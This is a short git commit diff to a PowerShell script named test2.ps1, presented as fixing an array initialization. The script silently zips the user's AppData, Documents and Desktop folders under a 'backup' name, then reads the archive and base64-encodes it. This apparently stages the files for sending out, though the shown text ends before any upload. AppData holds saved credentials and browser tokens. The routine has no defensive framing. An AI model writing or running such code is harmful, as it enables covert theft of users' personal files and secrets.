d9f74f2ffceafb14274ace01f04cc353296cf576
ferasdour <no_never001@yahoo.com>
2026-05-16 20:40:08 -0500

    Fix array initialization for DataPaths variable

--- test2.ps1
+++ test2.ps1
@@ -1,5 +1,5 @@
 $destination = "$HOME\\Desktop\\Feemco_AppData_Backup.zip"
-$DataPaths = @("$env:USERPROFILE\\AppData","$env:USERPROFILE\\Documents","$env:USERPROFILE\\Desktop")
+$DataPaths = ("$env:USERPROFILE\\AppData","$env:USERPROFILE\\Documents","$env:USERPROFILE\\Desktop")
 Compress-Archive -Path $DataPaths -DestinationPath $destination -Force -ErrorAction SilentlyContinue
 $fileBytes = [System.IO.File]::ReadAllBytes($destination)
 $base64File = [System.Convert]::ToBase64String($fileBytes)
